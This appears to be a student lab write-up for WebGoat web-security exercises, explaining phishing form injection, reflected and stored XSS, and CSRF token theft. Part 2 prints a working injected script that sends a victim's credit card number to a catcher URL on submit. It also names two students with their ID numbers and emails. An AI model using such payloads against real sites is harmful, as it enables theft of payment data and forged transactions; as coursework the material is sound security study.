#Benjamin Cheng, 1004838045, benjamin.cheng@mail.utoronto.ca
#Itta Kato, 1009764373, itta.kato@mail.utoronto.ca

Part 1 Explanation:
A form is injected with username, password, and a login field. A script is added
which adds an event listener to the submit event of the form, which then sends
a GET request to the required URL with the contents of the form.

Part 2 Explanation:
The server does input validation for the three digit access code. If it is
invalid, it displays a message with the invalid content to notify the user.
However, this is not escaped so HTML/JS inside this would be rendered/run by
the browser.

The script removes the message and sets the three digit access code as the
default, so as to imitate the original screen. It adds an event listener to the
form which sends a GET request with the credit card number on submit.

<script>
	document.getElementByID('message').remove();
	const form = document.form;
	form.addEventListener('submit', (event) => {
		fetch(`http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolen-credit-card=${form.input1.value}`);
	});
	form.input2.value = '000';
</script>

Part 3 Explanation:
The message field is rendered without proper escaping, so HTML can be injected
that will be rendered by users browsers when viewing the message.

Part 4 Explanation:
The CONFIRM button on the prompt simply creates another GET request with the
transfer parameter set to CONFIRMED. We add a script to the original code which
sends off this request after the browser has tried to load the original image.

Part 5 Explanation:
Since the attacking JS and the transfer page with the CSRF token live on the
same domain, a JS request to the main transfer screen can read the token from
the transfer page. A request is made to this page to retrieve the token, and
another request is sent with the transfer amount and token.
